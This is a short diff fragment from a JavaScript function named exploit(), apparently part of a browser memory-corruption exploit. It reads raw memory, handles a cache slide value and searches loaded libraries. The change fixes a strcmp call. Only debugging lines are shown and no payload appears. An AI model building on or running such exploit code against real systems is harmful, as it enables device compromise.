@@ -664,7 +664,7 @@ function exploit(){
             alert(base)
             //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
             log(fn())
-            if(opcode_libs.some(lib => strcmp(fn, lib)))
+            if(opcode_libs.some(lib => strcmp(fn(), lib)))
             {
                 alert("...")
                 var ncmds = memory.u32(Add(base, 0x10));
